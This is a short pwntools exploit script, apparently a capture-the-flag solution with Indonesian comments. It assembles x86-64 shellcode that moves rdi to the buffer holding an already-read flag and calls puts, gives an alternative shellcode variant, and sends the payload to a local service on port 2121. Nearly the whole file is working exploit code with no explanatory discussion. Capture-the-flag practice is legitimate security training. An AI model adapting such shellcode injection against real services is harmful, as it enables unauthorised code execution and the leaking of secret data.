from pwn import *

context.arch="amd64"

# Inti nya adalah kita harus set nilai rdi ke buf yang menyimpan flag yang terlah dibaca
# lalu memanggil fungsi puts

sh = asm("call [rsp+40]; add rdi,20; mov rax, [rsp]; mov al,46; call rax")
# atau
# sh = asm("mov rdi,[rsp+24];add di,564;mov rax, [rsp]; mov al,46; call rax")

DEBUG = False
if not DEBUG:
	p = remote("127.0.0.1",2121)
	p.sendline(sh)
	p.interactive()
	
else:
	print sh